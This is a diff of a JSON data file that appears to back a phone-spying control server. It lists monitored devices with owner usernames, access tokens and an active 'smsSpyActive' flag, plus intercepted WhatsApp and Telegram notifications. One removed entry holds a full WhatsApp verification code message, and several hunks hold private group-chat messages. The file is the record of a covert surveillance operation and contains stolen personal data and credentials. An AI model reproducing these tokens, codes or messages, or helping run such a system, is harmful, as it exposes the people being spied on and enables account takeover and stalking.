@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775660970,
+    "lastSeen": 1776775663963,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3739 pesan dari 23 chat",
+        "time": "21/04 19:47",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775661278
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (82 pesan): ~ BASS STR",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774092213
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (47 pesan): Givano",
-        "content": "Oke",
-        "time": "21/04 19:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774092150
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775658572,
+    "lastSeen": 1776775664631,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775659631,
+    "lastSeen": 1776775665512,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5873 pesan baru dari 48 obrolan",
+        "time": "21/04 19:47",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775666881
+      },
       {
         "appName": "WhatsApp",
         "sender": "[ suendi ]",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773362882
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********840\n💰 Price: Rp 3.400\n🔢 Code: 365406\n━━━━━━━━━━━━━━━\n📨 Message:\n Akun WhatsApp Anda sedang didaftarkan di perangkat baru\n\nJangan bagikan kode dengan siapa pun\nKode WhatsApp Anda: 365-406\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008717576\n🏷️ System ID: FSCL78251124\n⏰ 21 Apr 2026 • 19:08 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362849
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775660186,
+    "lastSeen": 1776775666193,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
